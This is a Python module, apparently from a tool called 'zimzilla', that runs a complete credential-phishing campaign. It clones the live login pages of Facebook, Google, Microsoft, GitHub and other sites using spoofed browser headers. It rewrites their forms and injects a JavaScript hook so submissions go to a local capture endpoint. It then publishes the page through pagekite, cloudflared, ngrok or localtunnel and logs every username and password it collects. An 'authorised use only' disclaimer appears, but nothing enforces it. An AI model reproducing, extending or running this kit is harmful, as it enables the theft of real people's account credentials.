"""`/phish` — clone a login page, serve it, tunnel it, harvest credentials.

The command is an **engine**, not a playbook. `/osint` hands a briefing to the
agent and lets the loop do the work; `/phish` cannot, because a phishing page
has to stay up after the turn that launched it, and the credentials it
collects have to land in zim-pane in real time rather than in a report written
at the end. So this module owns the whole life of a campaign:

  1. validate the target
  2. open a campaign directory under ``<state_dir>/phish/``
  3. fetch the live page (or fall back to a branded template)
  4. rewrite every form so it POSTs back here
  5. serve it on a local port
  6. try to open a public tunnel (pagekite first, then cloudflared / ngrok / lt)
  7. append every hit and every captured credential to a JSONL log

The UI (``ZimPane`` + ``_cmd_phish``) is the only thing that talks to this
module. No Textual, no colours — the same split as ``zimzilla/osint.py`` and
``zimzilla/team.py``, so the engine is testable without a terminal.

Authorised use only. The command says so on every run; it does not and cannot
check it. The operator is responsible for having permission to clone the
target and to collect whatever is submitted.
"""

from __future__ import annotations

import html
import json
import os
import re
import shutil
import socket
import subprocess
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Callable

# ---------------------------------------------------------------------------
# Target
# ---------------------------------------------------------------------------

# A hostname with at least one dot, optional scheme, optional path. Loose on
# purpose: the job is to catch an empty argument or an obvious typo, not to
# re-implement WHATWG. IPv4 is accepted so a lab box can be cloned too.
_HOST_RE = re.compile(
    r"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$"
)
_IPV4_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")
_SLUG_RE = re.compile(r"[^a-zA-Z0-9._-]+")

# Form fields that look like a credential. Matched case-insensitively against
# the submitted name; the first hit of each kind is what zim-pane highlights.
_USER_KEYS = (
    "username", "user", "email", "login", "userid", "user_id", "account",
    "identifier", "id", "mail", "phone", "mobile",
)
_PASS_KEYS = (
    "password", "passwd", "pass", "pwd", "secret", "pin", "token",
    "passcode", "passphrase",
)

# Browser-looking UA. A handful of login pages 403 a bare urllib UA and we
# would rather clone the real page than fall back to the template.
_UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
)

# Extra headers a real Chrome navigation sends. Facebook (and a few other
# CDNs) 400 a request that only has UA/Accept — the Sec-Fetch-* set is what
# turns that into the live login HTML.
_FETCH_HEADERS = {
    "User-Agent": _UA,
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;q=0.9,"
        "image/avif,image/webp,*/*;q=0.8"
    ),
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "identity",
    "Upgrade-Insecure-Requests": "1",
    "Cache-Control": "max-age=0",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
}

# Bare host → the URL that actually serves that site's login form.
# `/phish www.facebook.com` must clone facebook.com/login, not the marketing
# homepage and not the generic branded card. A pasted path still wins.
_LOGIN_PATHS: dict[str, str] = {
    "facebook.com": "https://www.facebook.com/login/",
    "www.facebook.com": "https://www.facebook.com/login/",
    "m.facebook.com": "https://www.facebook.com/login/",
    "mbasic.facebook.com": "https://www.facebook.com/login/",
    "fb.com": "https://www.facebook.com/login/",
    "instagram.com": "https://www.instagram.com/accounts/login/",
    "www.instagram.com": "https://www.instagram.com/accounts/login/",
    "github.com": "https://github.com/login",
    "www.github.com": "https://github.com/login",
    "linkedin.com": "https://www.linkedin.com/login",
    "www.linkedin.com": "https://www.linkedin.com/login",
    "x.com": "https://x.com/i/flow/login",
    "www.x.com": "https://x.com/i/flow/login",
    "twitter.com": "https://x.com/i/flow/login",
    "www.twitter.com": "https://x.com/i/flow/login",
    "accounts.google.com": "https://accounts.google.com/ServiceLogin",
    "google.com": "https://accounts.google.com/ServiceLogin",
    "www.google.com": "https://accounts.google.com/ServiceLogin",
    "login.microsoftonline.com": "https://login.microsoftonline.com/",
    "microsoft.com": "https://login.microsoftonline.com/",
    "www.microsoft.com": "https://login.microsoftonline.com/",
    "office.com": "https://login.microsoftonline.com/",
    "www.office.com": "https://login.microsoftonline.com/",
    "yahoo.com": "https://login.yahoo.com/",
    "www.yahoo.com": "https://login.yahoo.com/",
    "login.yahoo.com": "https://login.yahoo.com/",
}

# Generic paths to try, in order, when the host is not in the table above
# and the operator did not paste a path themselves.
_GENERIC_LOGIN_PATHS = (
    "/login",
    "/login/",
    "/signin",
    "/sign-in",
    "/account/login",
    "/accounts/login",
    "/accounts/login/",
    "/user/login",
    "/users/sign_in",
    "/auth/login",
    "/session/new",
)

# How long we wait for a tunnel binary to print a public URL.
_TUNNEL_WAIT = 12.0
# PageKite talks to pagekite.net before it prints a URL; give it longer.
_PAGEKITE_WAIT = 25.0

# Vendored pagekite.py lives next to the other shipped artifacts. setup.sh
# copies it into ~/.zimzilla/pagekite/ so a relocated install still finds it.
_PAGEKITE_CANDIDATES = (
    Path(os.environ.get("ZIMZILLA_HOME") or (Path.home() / ".zimzilla"))
    / "pagekite" / "pagekite.py",
    Path(__file__).resolve().parent.parent / "packaging" / "pagekite" / "pagekite.py",
)


def normalise_target(raw: str) -> str:
    """Reduce a typed target to ``host`` (no scheme, no path, no port).

    ``/phish site.com``, ``/phish https://site.com/login`` and
    ``/phish www.site.com`` all become the same host so the campaign
    directory, the cloned Origin and the zim-pane header cannot disagree.
    """
    text = (raw or "").strip()
    if not text:
        return ""
    if "://" not in text:
        text = "https://" + text
    parsed = urllib.parse.urlparse(text)
    host = (parsed.hostname or "").strip(".").lower()
    return host


def target_url(raw: str) -> str:
    """The URL we actually fetch.

    A pasted path is kept (``site.com/login`` clones that page, not the
    homepage). A bare host is rewritten to that site's known login URL
    so ``/phish www.facebook.com`` clones the Facebook login form, not
    the marketing homepage. A missing scheme becomes https.
    """
    text = (raw or "").strip()
    if not text:
        return ""
    if "://" not in text:
        text = "https://" + text
    parsed = urllib.parse.urlparse(text)
    if not parsed.netloc:
        return ""
    host = (parsed.hostname or "").strip(".").lower()
    path = parsed.path or ""
    # Only a host (or `/`) — pick the real login page for that brand.
    if host in _LOGIN_PATHS and path in ("", "/"):
        return _LOGIN_PATHS[host]
    # Drop fragments; keep query — some login pages key off it.
    rebuilt = parsed._replace(fragment="")
    return urllib.parse.urlunparse(rebuilt)


def login_candidates(raw: str) -> list[str]:
    """URLs to try, in order, until one actually looks like a login page.

    The first entry is always ``target_url`` so a pasted path still wins.
    Extra well-known paths are appended so a bare ``/phish shop.example``
    still lands on ``/login`` rather than a homepage with no form.
    """
    primary = target_url(raw)
    if not primary:
        return []
    parsed = urllib.parse.urlparse(primary)
    host = (parsed.hostname or "").strip(".").lower()
    path = parsed.path or "/"
    out: list[str] = [primary]
    # A pasted path is authoritative — do not spray extra guesses.
    if path not in ("", "/"):
        return out
    origin = f"{parsed.scheme}://{parsed.netloc}"
    for suffix in _GENERIC_LOGIN_PATHS:
        guess = origin + suffix
        if guess not in out:
            out.append(guess)
    # Last resort: the bare origin, in case the homepage IS the login.
    if origin + "/" not in out and origin not in out:
        out.append(origin + "/")
    # Known-host mapping already put the right URL first; keep the rest
    # as fallbacks in case that host moved.
    if host in _LOGIN_PATHS and _LOGIN_PATHS[host] not in out:
        out.insert(0, _LOGIN_PATHS[host])
    return out


def looks_like_login(html_text: str) -> bool:
    """True when the page is the site's own sign-in, not a marketing homepage.

    Google / Microsoft / Yahoo paint the form in JS, so there is often no
    ``<form>`` in the first HTML. A password field, a sign-in title, or a
    known accounts host still counts — throwing those away is how
    ``/phish www.google.com`` used to serve the generic card.
    """
    if not html_text:
        return False
    lowered = html_text.lower()
    if re.search(r'type\s*=\s*["\']password["\']', lowered):
        return True
    if "<form" in lowered and re.search(
        r"(sign\s*in|log\s*in|password|passcode|email|username)", lowered
    ):
        return True
    # JS-rendered sign-in shells (Google accounts, Microsoft, etc.).
    if re.search(
        r"(sign\s*in|log\s*in|accounts\.google|login\.microsoft|"
        r"identifierid|passwordelement)",
        lowered,
    ) and ("<html" in lowered or "<!doctype" in lowered):
        return True
    return False


def validate_target(raw: str) -> tuple[bool, str]:
    """Check a typed target. Returns ``(ok, error_message)``."""
    host = normalise_target(raw)
    if not host:
        return False, "no target given"
    if _IPV4_RE.match(host):
        parts = host.split(".")
        if all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
            return True, ""
        return False, f"not a valid IPv4 address: {host}"
    if not _HOST_RE.match(host):
        return False, f"not a valid hostname: {host}"
    return True, ""


def case_slug(target: str) -> str:
    """A filesystem-safe, recognisable label for a target."""
    s = _SLUG_RE.sub("-", target.strip()).strip("-.")
    return (s[:64] or "target").lower()


def campaign_dir(cfg, target: str) -> Path:
    """Create and return this run's campaign directory.

    ``<state_dir>/phish/<slug>-<timestamp>/`` — under state_dir so campaign
    files land beside sessions rather than in whatever repo the operator
    happens to be in. Created eagerly so the server can write into it from
    its first request.
    """
    stamp = time.strftime("%Y%m%d-%H%M%S")
    label = case_slug(normalise_target(target) or target)
    d = Path(cfg.state_dir) / "phish" / f"{label}-{stamp}"
    d.mkdir(parents=True, exist_ok=True)
    return d


# ---------------------------------------------------------------------------
# Page clone / rewrite
# ---------------------------------------------------------------------------

def _inject_base(html_text: str, origin: str) -> str:
    """Make relative URLs resolve against the cloned origin.

    Without this, ``/static/app.css`` on the phishing host 404s and the page
    looks broken. A ``<base href>`` is the smallest change that keeps the
    clone looking like the original.
    """
    origin = origin.rstrip("/") + "/"
    tag = f'<base href="{html.escape(origin, quote=True)}">'
    if re.search(r"<base\s", html_text, flags=re.I):
        return re.sub(r"<base\s[^>]*>", tag, html_text, count=1, flags=re.I)
    if re.search(r"<head[^>]*>", html_text, flags=re.I):
        return re.sub(
            r"(<head[^>]*>)", r"\1\n" + tag, html_text, count=1, flags=re.I
        )
    return tag + "\n" + html_text


_CAPTURE_HOOK = """
<script>
(function () {
  function send(fd) {
    try {
      fetch("/__zim_capture", {method: "POST", body: fd, credentials: "same-origin"});
    } catch (e) {}
  }
  function hijack(form) {
    if (!form || form.dataset.zimHooked) return;
    form.dataset.zimHooked = "1";
    form.setAttribute("action", "/__zim_capture");
    form.setAttribute("method", "POST");
    form.removeAttribute("target");
    form.addEventListener("submit", function (ev) {
      ev.preventDefault();
      ev.stopPropagation();
      try { send(new FormData(form)); } catch (e) {}
      window.location = "/__zim_thanks";
      return false;
    }, true);
  }
  function scan(root) {
    (root.querySelectorAll ? root.querySelectorAll("form") : []).forEach(hijack);
  }
  scan(document);
  document.addEventListener("submit", function (ev) {
    var form = ev.target;
    if (!form || !form.tagName || form.tagName.toLowerCase() !== "form") return;
    ev.preventDefault();
    ev.stopPropagation();
    hijack(form);
    try { send(new FormData(form)); } catch (e) {}
    window.location = "/__zim_thanks";
    return false;
  }, true);
  if (window.MutationObserver) {
    new MutationObserver(function (muts) {
      muts.forEach(function (m) {
        m.addedNodes.forEach(function (n) {
          if (n && n.nodeType === 1) {
            if (n.tagName && n.tagName.toLowerCase() === "form") hijack(n);
            scan(n);
          }
        });
      });
    }).observe(document.documentElement, {childList: true, subtree: true});
  }
})();
</script>
"""


def _inject_capture_hook(html_text: str) -> str:
    """Catch forms the live page builds in JS after paint.

    Google / Microsoft / a lot of modern logins have no ``<form>`` in the
    first HTML. Rewriting static tags is not enough — we have to hook
    submit (and any form that appears later) so the clone still harvests.
    """
    if "zimHooked" in html_text:
        return html_text
    if re.search(r"</body\s*>", html_text, flags=re.I):
        return re.sub(r"</body\s*>", _CAPTURE_HOOK + "</body>", html_text,
                      count=1, flags=re.I)
    return html_text + _CAPTURE_HOOK


def _rewrite_forms(html_text: str) -> str:
    """Point every form at our capture endpoint and force POST.

    The cloned page's own ``action`` would submit to the real site; that is
    the opposite of what this command is for. We also drop
    ``onsubmit``/``target`` so client-side validation or a new-tab submit
    cannot skip the capture.
    """
    def repl(match: re.Match) -> str:
        tag = match.group(0)
        tag = re.sub(r'\saction\s*=\s*("[^"]*"|\'[^\']*\'|[^\s>]+)',
                     "", tag, flags=re.I)
        tag = re.sub(r'\smethod\s*=\s*("[^"]*"|\'[^\']*\'|[^\s>]+)',
                     "", tag, flags=re.I)
        tag = re.sub(r'\starget\s*=\s*("[^"]*"|\'[^\']*\'|[^\s>]+)',
                     "", tag, flags=re.I)
        tag = re.sub(r'\sonsubmit\s*=\s*("[^"]*"|\'[^\']*\'|[^\s>]+)',
                     "", tag, flags=re.I)
        # Insert just before the closing `>`.
        return tag[:-1] + ' action="/__zim_capture" method="POST">'

    return re.sub(r"<form\b[^>]*>", repl, html_text, flags=re.I)


def _branded_template(host: str) -> str:
    """A clean login page used when the live fetch fails.

    Looks enough like a branded portal that a lab victim will type into it;
    it is not a pixel-perfect clone and does not pretend to be.
    """
    safe = html.escape(host)
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in · {safe}</title>
<style>
  :root {{ color-scheme: light; }}
  * {{ box-sizing: border-box; }}
  body {{
    margin: 0; min-height: 100vh; display: grid; place-items: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    background: #0b1220; color: #0b1220;
  }}
  .card {{
    width: min(420px, 92vw); background: #fff; border-radius: 12px;
    padding: 36px 32px 28px; box-shadow: 0 24px 60px rgba(0,0,0,.35);
  }}
  .mark {{
    width: 40px; height: 40px; border-radius: 10px;
    background: #111827; color: #fff; display: grid; place-items: center;
    font-weight: 700; letter-spacing: .04em; margin-bottom: 18px;
  }}
  h1 {{ font-size: 22px; margin: 0 0 6px; }}
  p.sub {{ margin: 0 0 22px; color: #6b7280; font-size: 14px; }}
  label {{ display: block; font-size: 13px; font-weight: 600; margin: 12px 0 6px; }}
  input {{
    width: 100%; padding: 11px 12px; border: 1px solid #d1d5db;
    border-radius: 8px; font-size: 15px;
  }}
  input:focus {{ outline: 2px solid #111827; outline-offset: 1px; }}
  button {{
    width: 100%; margin-top: 20px; padding: 12px;
    background: #111827; color: #fff; border: 0; border-radius: 8px;
    font-size: 15px; font-weight: 600; cursor: pointer;
  }}
  .fine {{ margin-top: 16px; font-size: 12px; color: #9ca3af; text-align: center; }}
</style>
</head>
<body>
  <form class="card" action="/__zim_capture" method="POST">
    <div class="mark">{safe[:1].upper()}</div>
    <h1>Sign in to {safe}</h1>
    <p class="sub">Use your {safe} account to continue.</p>
    <label for="email">Email or username</label>
    <input id="email" name="email" type="text" autocomplete="username" required>
    <label for="password">Password</label>
    <input id="password" name="password" type="password" autocomplete="current-password" required>
    <button type="submit">Continue</button>
    <p class="fine">Protected connection · {safe}</p>
  </form>
</body>
</html>
"""


def _thanks_page(host: str) -> str:
    safe = html.escape(host)
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Signed in · {safe}</title>
<style>
  body {{
    margin: 0; min-height: 100vh; display: grid; place-items: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    background: #0b1220; color: #e5e7eb;
  }}
  .box {{ text-align: center; }}
  h1 {{ font-size: 22px; margin: 0 0 8px; }}
  p {{ color: #9ca3af; }}
</style>
</head>
<body>
  <div class="box">
    <h1>Checking your details…</h1>
    <p>You will be redirected shortly.</p>
  </div>
</body>
</html>
"""


def fetch_page(url: str, timeout: float = 12.0) -> tuple[str | None, str]:
    """GET *url*. Returns ``(html_or_none, note)``.

    A failure is not fatal — the caller falls back to the branded template
    and the note is what zim-pane shows as the clone status.
    """
    req = urllib.request.Request(url, headers=dict(_FETCH_HEADERS), method="GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            ctype = (resp.headers.get("Content-Type") or "").lower()
            if "html" not in ctype and not raw.lstrip()[:32].lower().startswith(
                (b"<!doctype", b"<html")
            ):
                return None, f"not html ({ctype or 'unknown type'})"
            charset = "utf-8"
            if "charset=" in ctype:
                charset = ctype.split("charset=", 1)[1].split(";")[0].strip() or "utf-8"
            try:
                text = raw.decode(charset, errors="replace")
            except LookupError:
                text = raw.decode("utf-8", errors="replace")
            return text, f"cloned {resp.geturl()} ({len(raw)} bytes)"
    except urllib.error.HTTPError as e:
        return None, f"http {e.code}"
    except urllib.error.URLError as e:
        reason = getattr(e, "reason", e)
        return None, f"fetch failed: {reason}"
    except Exception as e:  # noqa: BLE001
        return None, f"fetch failed: {type(e).__name__}: {e}"


def clone_login(raw: str, timeout: float = 12.0) -> tuple[str | None, str, str]:
    """Walk login candidates until one looks like the real sign-in page.

    Returns ``(html_or_none, note, url_used)``. Prefer a page that looks
    like a login. If none do, still return the best live HTML we got —
    serving the site's own page (even a JS shell) looks like the target;
    the generic card does not. The template is only for a total fetch miss.
    """
    tried: list[str] = []
    last_note = "no candidates"
    last_url = target_url(raw)
    fallback_html: str | None = None
    fallback_note = last_note
    fallback_url = last_url
    for url in login_candidates(raw):
        html_text, note = fetch_page(url, timeout=timeout)
        last_note = note
        last_url = url
        if not html_text:
            tried.append(f"{url} ({note})")
            continue
        if looks_like_login(html_text):
            return html_text, note, url
        if fallback_html is None or len(html_text) > len(fallback_html):
            fallback_html = html_text
            fallback_note = note + " (best live page; no static form)"
            fallback_url = url
        tried.append(f"{url} (no login form)")
    if fallback_html:
        return fallback_html, fallback_note, fallback_url
    if tried:
        last_note = "no login form on: " + "; ".join(tried[:4])
    return None, last_note, last_url


def build_page(host: str, url: str, fetched: str | None) -> tuple[str, bool]:
    """Return ``(html, cloned)`` ready to serve.

    *cloned* is True only when the live page was used. The template is always
    a last resort, never a silent substitute the operator cannot see.
    """
    if fetched:
        origin = f"{urllib.parse.urlparse(url).scheme}://{urllib.parse.urlparse(url).netloc}"
        page = _inject_base(fetched, origin)
        page = _rewrite_forms(page)
        page = _inject_capture_hook(page)
        return page, True
    return _branded_template(host), False


def pick_credentials(fields: dict[str, str]) -> tuple[str, str]:
    """Best-effort (user, password) from a submitted field map."""
    user = ""
    password = ""
    lowered = {k.lower(): v for k, v in fields.items()}
    for key in _USER_KEYS:
        if key in lowered and lowered[key]:
            user = lowered[key]
            break
    for key in _PASS_KEYS:
        if key in lowered and lowered[key]:
            password = lowered[key]
            break
    if not user:
        # First non-password field, so a weird name still shows something.
        for k, v in fields.items():
            if k.lower() not in _PASS_KEYS and v:
                user = v
                break
    return user, password


# ---------------------------------------------------------------------------
# Tunnel
# ---------------------------------------------------------------------------

@dataclass
class Tunnel:
    """A public URL in front of the local server, or a failed attempt."""

    url: str = ""
    tool: str = ""
    error: str = ""
    proc: subprocess.Popen | None = field(default=None, repr=False)

    @property
    def ok(self) -> bool:
        return bool(self.url)

    def stop(self) -> None:
        if self.proc is None:
            return
        try:
            self.proc.terminate()
            self.proc.wait(timeout=3)
        except Exception:
            try:
                self.proc.kill()
            except Exception:
                pass
        self.proc = None


def _which(name: str) -> str | None:
    return shutil.which(name)


def _read_until(proc: subprocess.Popen, pattern: re.Pattern, timeout: float) -> str:
    """Read *proc*'s combined output until *pattern* matches or we time out.

    The child is started with a single PIPE for stdout+stderr so we only
    have one stream to drain. Returns whatever was read (matched or not).
    """
    chunks: list[str] = []
    deadline = time.monotonic() + timeout
    # Non-blocking-ish: readline will return when the child prints a line.
    # We still bound the whole wait so a silent binary cannot hang the UI.
    while time.monotonic() < deadline:
        if proc.poll() is not None and not getattr(proc, "_pending", None):
            # Drain whatever is left, then stop.
            try:
                rest = proc.stdout.read() if proc.stdout else ""
            except Exception:
                rest = ""
            if rest:
                chunks.append(rest if isinstance(rest, str) else rest.decode("utf-8", "replace"))
            break
        line = ""
        try:
            if proc.stdout is not None:
                line = proc.stdout.readline()
        except Exception:
            break
        if not line:
            if proc.poll() is not None:
                break
            time.sleep(0.05)
            continue
        if isinstance(line, bytes):
            line = line.decode("utf-8", "replace")
        chunks.append(line)
        if pattern.search("".join(chunks)):
            break
    return "".join(chunks)


def pagekite_bin() -> Path | None:
    """The pagekite.py we will actually run, or None if it is not installed."""
    override = os.environ.get("PAGEKITE_BIN")
    if override:
        p = Path(override).expanduser()
        if p.is_file():
            return p
    for cand in _PAGEKITE_CANDIDATES:
        if cand.is_file():
            return cand
    which = _which("pagekite.py") or _which("pagekite")
    return Path(which) if which else None


def pagekite_name() -> str:
    """Public kite name, e.g. ``zim.pagekite.me``.

    Looked up in order: ``PAGEKITE_NAME``, then
    ``~/.zimzilla/pagekite.name``. Empty means PageKite cannot fly
    unattended — ``open_tunnel`` will skip it rather than hang on signup.
    """
    env = (os.environ.get("PAGEKITE_NAME") or "").strip()
    if env:
        return env
    path = (
        Path(os.environ.get("ZIMZILLA_HOME") or (Path.home() / ".zimzilla"))
        / "pagekite.name"
    )
    try:
        return path.read_text(encoding="utf-8").strip().splitlines()[0].strip()
    except (OSError, IndexError):
        return ""


def _open_pagekite(port: int) -> Tunnel:
    """Fly the local campaign through pagekite.net.

    This is the worldwide forwarder: every phishing link is meant to ship
    from here. Needs a kite name (``PAGEKITE_NAME`` or
    ``~/.zimzilla/pagekite.name``) and a prior ``pagekite.py --signup`` so
    the secret is already in ``~/.pagekite.rc``. ``--nullui`` keeps it
    from blocking the TUI on a prompt.
    """
    bin_path = pagekite_bin()
    if bin_path is None:
        return Tunnel(error="pagekite.py not installed")
    name = pagekite_name()
    if not name:
        return Tunnel(
            error="pagekite: set PAGEKITE_NAME or ~/.zimzilla/pagekite.name "
                  "(then: pagekite.py --signup)"
        )
    if "." not in name:
        name = name + ".pagekite.me"
    url = "https://" + name if "://" not in name else name
    host = urllib.parse.urlparse(url).hostname or name
    try:
        proc = subprocess.Popen(
            [
                str(bin_path),
                "--clean",
                "--nullui",
                "--defaults",
                "--optfile", str(Path.home() / ".pagekite.rc"),
                f"localhost:{port}",
                host,
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
    except OSError as e:
        return Tunnel(error=f"pagekite failed to start: {e}")
    blob = _read_until(
        proc,
        re.compile(r"https?://[a-zA-Z0-9._-]+\.pagekite\.me"),
        _PAGEKITE_WAIT,
    )
    m = re.search(r"(https?://[a-zA-Z0-9._-]+\.pagekite\.me)", blob)
    if m:
        public = m.group(1)
        if public.startswith("http://"):
            public = "https://" + public[len("http://"):]
        return Tunnel(url=public, tool="pagekite", proc=proc)
    # pagekite often prints the kite name without a scheme once it is flying.
    if re.search(re.escape(host), blob, flags=re.I) and proc.poll() is None:
        return Tunnel(url="https://" + host, tool="pagekite", proc=proc)
    proc.kill()
    tail = " ".join(blob.strip().splitlines()[-2:])[:180] if blob.strip() else "no output"
    return Tunnel(error=f"pagekite started but printed no URL ({tail})")


def _open_cloudflared(port: int) -> Tunnel:
    bin_path = _which("cloudflared")
    if not bin_path:
        return Tunnel(error="cloudflared not installed")
    try:
        proc = subprocess.Popen(
            [bin_path, "tunnel", "--url", f"http://127.0.0.1:{port}",
             "--no-autoupdate"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
    except OSError as e:
        return Tunnel(error=f"cloudflared failed to start: {e}")
    blob = _read_until(proc, re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com"),
                       _TUNNEL_WAIT)
    m = re.search(r"(https://[a-z0-9-]+\.trycloudflare\.com)", blob)
    if m:
        return Tunnel(url=m.group(1), tool="cloudflared", proc=proc)
    proc.kill()
    return Tunnel(error="cloudflared started but printed no URL")


def _open_ngrok(port: int) -> Tunnel:
    bin_path = _which("ngrok")
    if not bin_path:
        return Tunnel(error="ngrok not installed")
    try:
        proc = subprocess.Popen(
            [bin_path, "http", str(port), "--log", "stdout", "--log-format", "json"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
    except OSError as e:
        return Tunnel(error=f"ngrok failed to start: {e}")
    blob = _read_until(proc, re.compile(r"https://[a-z0-9-]+\.ngrok(?:-free)?\.(?:app|io)"),
                       _TUNNEL_WAIT)
    m = re.search(r"(https://[a-z0-9-]+\.ngrok(?:-free)?\.(?:app|io))", blob)
    if m:
        return Tunnel(url=m.group(1), tool="ngrok", proc=proc)
    # ngrok's JSON log uses url=; fall back to that.
    m = re.search(r'"url"\s*:\s*"(https://[^"]+)"', blob)
    if m and "ngrok" in m.group(1):
        return Tunnel(url=m.group(1), tool="ngrok", proc=proc)
    proc.kill()
    return Tunnel(error="ngrok started but printed no URL")


def _open_localtunnel(port: int) -> Tunnel:
    bin_path = _which("lt")
    if not bin_path:
        return Tunnel(error="localtunnel (lt) not installed")
    try:
        proc = subprocess.Popen(
            [bin_path, "--port", str(port)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
    except OSError as e:
        return Tunnel(error=f"localtunnel failed to start: {e}")
    blob = _read_until(proc, re.compile(r"https://[a-z0-9-]+\.loca\.lt"),
                       _TUNNEL_WAIT)
    m = re.search(r"(https://[a-z0-9-]+\.loca\.lt)", blob)
    if m:
        return Tunnel(url=m.group(1), tool="localtunnel", proc=proc)
    proc.kill()
    return Tunnel(error="localtunnel started but printed no URL")


def open_tunnel(port: int) -> Tunnel:
    """Try pagekite first, then cloudflared / ngrok / localtunnel.

    PageKite is the shipped worldwide forwarder: every phishing link is
    meant to go out through it. The others stay as fallbacks so a box
    without a kite name still gets a public URL when it can. A campaign
    without a public URL is still useful on the LAN — the local bind is
    always printed — so a total miss is an error string, not an exception.
    """
    attempts = (_open_pagekite, _open_cloudflared, _open_ngrok, _open_localtunnel)
    errors: list[str] = []
    for opener in attempts:
        tun = opener(port)
        if tun.ok:
            return tun
        if tun.error:
            errors.append(tun.error)
    return Tunnel(error="; ".join(errors) or "no tunnel tool available")


# ---------------------------------------------------------------------------
# Server
# ---------------------------------------------------------------------------

LogFn = Callable[[dict], None]


def _free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return int(s.getsockname()[1])


def _parse_body(handler: BaseHTTPRequestHandler) -> dict[str, str]:
    length = int(handler.headers.get("Content-Length") or 0)
    raw = handler.rfile.read(length) if length else b""
    ctype = (handler.headers.get("Content-Type") or "").lower()
    if "application/json" in ctype:
        try:
            data = json.loads(raw.decode("utf-8", "replace") or "{}")
        except json.JSONDecodeError:
            return {"_raw": raw.decode("utf-8", "replace")}
        if isinstance(data, dict):
            return {str(k): "" if v is None else str(v) for k, v in data.items()}
        return {"_raw": json.dumps(data)}
    # Default: application/x-www-form-urlencoded (and anything else we can parse).
    parsed = urllib.parse.parse_qs(raw.decode("utf-8", "replace"), keep_blank_values=True)
    return {k: (v[-1] if v else "") for k, v in parsed.items()}


class Campaign:
    """One live phishing campaign: page + server + tunnel + log.

    The HTTP server runs on a daemon thread so the TUI stays responsive.
    Every request is appended to ``hits.jsonl`` and pushed to *on_event*
    (zim-pane subscribes). ``stop()`` tears the whole thing down.
    """

    def __init__(
        self,
        target: str,
        directory: Path,
        on_event: LogFn | None = None,
        *,
        fetch: bool = True,
        tunnel: bool = True,
        port: int | None = None,
    ) -> None:
        self.raw_target = target
        self.host = normalise_target(target)
        self.url = target_url(target)
        self.directory = Path(directory)
        self.on_event = on_event
        self.started_at = time.time()
        self.hits: list[dict] = []
        self.creds: list[dict] = []
        self._lock = threading.Lock()
        self._httpd: ThreadingHTTPServer | None = None
        self._thread: threading.Thread | None = None
        self.tunnel = Tunnel()
        self.port = int(port) if port else _free_port()
        self.local_url = f"http://127.0.0.1:{self.port}/"
        self.public_url = ""
        self.clone_note = ""
        self.cloned = False
        self.page_html = ""
        self.thanks_html = _thanks_page(self.host or "account")
        self.log_path = self.directory / "hits.jsonl"
        self.creds_path = self.directory / "creds.jsonl"
        self.alive = False

        if fetch:
            fetched, note, used = clone_login(target)
            if used:
                self.url = used
            self.clone_note = note
            self.page_html, self.cloned = build_page(self.host, self.url, fetched)
        else:
            self.clone_note = "template (fetch skipped)"
            self.page_html, self.cloned = build_page(self.host, self.url, None)

        (self.directory / "index.html").write_text(self.page_html, encoding="utf-8")
        (self.directory / "meta.json").write_text(
            json.dumps({
                "host": self.host,
                "url": self.url,
                "cloned": self.cloned,
                "clone_note": self.clone_note,
                "started_at": self.started_at,
            }, indent=2) + "\n",
            encoding="utf-8",
        )

        self._start_server()
        if tunnel:
            self.tunnel = open_tunnel(self.port)
            if self.tunnel.ok:
                self.public_url = self.tunnel.url
        self.alive = True
        self._emit({
            "kind": "ready",
            "host": self.host,
            "local": self.local_url,
            "public": self.public_url,
            "tool": self.tunnel.tool,
            "clone": self.clone_note,
            "cloned": self.cloned,
            "tunnel_error": self.tunnel.error,
            "ts": time.time(),
        })

    # ---- http -------------------------------------------------------------
    def _start_server(self) -> None:
        campaign = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt: str, *args) -> None:  # noqa: A003
                # Silence the default stderr access log — zim-pane is the log.
                return

            def _send(self, code: int, body: str, ctype: str = "text/html; charset=utf-8") -> None:
                data = body.encode("utf-8")
                self.send_response(code)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(data)))
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(data)

            def do_GET(self) -> None:  # noqa: N802
                path = urllib.parse.urlparse(self.path).path
                if path == "/__zim_thanks":
                    self._send(200, campaign.thanks_html)
                    return
                if path in ("/", "/index.html", "/login", "/signin"):
                    campaign._hit("GET", path, {})
                    self._send(200, campaign.page_html)
                    return
                if path == "/favicon.ico":
                    self.send_response(204)
                    self.end_headers()
                    return
                campaign._hit("GET", path, {})
                self._send(200, campaign.page_html)

